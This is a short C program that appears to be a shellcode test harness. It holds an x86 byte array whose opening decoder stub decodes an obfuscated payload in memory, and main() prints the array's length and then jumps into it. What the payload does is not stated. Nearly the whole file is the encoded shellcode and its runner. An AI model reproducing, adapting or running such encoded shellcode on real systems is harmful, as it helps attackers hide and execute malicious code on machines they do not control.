#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\xeb\x3f\x5e\x8d\x7e\x01\x31\xc0\x99\xb0\x01\x31\xc9\x31\xdb\x8a\x1c\x06\x80\xf3\xa0\x74\x2f\x80\xf3\x5f\x8a\x1c\x16\x75\x04\xd2\xcb\xeb\x02\xd2\xc3\x80\xf3\x01\x88\x1c\x16\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xfe\xc2\xfe\xc1\x80\xf9\x08\x75\xd2\x31\xc9\xeb\xce\xe8\xbc\xff\xff\xff\x30\x02\x83\xff\x45\xff\x4b\xff\xe2\x02\x71\x02\xc9\x02\xb4\xff\x69\xff\x17\x02\x8d\xff\x0d\x02\xf6\xff\x44\x02\x8b\x02\xa8\xff\x88\x02\xc7\xff\x94\x02\x11\x02\x0e\x02\x36\xff\x28\x02\x99\x02\x81\xff\xa0\xa0";

main() {

	printf("Shellcode Length: %d\n", strlen(code));
	int (*ret)() = (int(*)())code;

	ret();

}


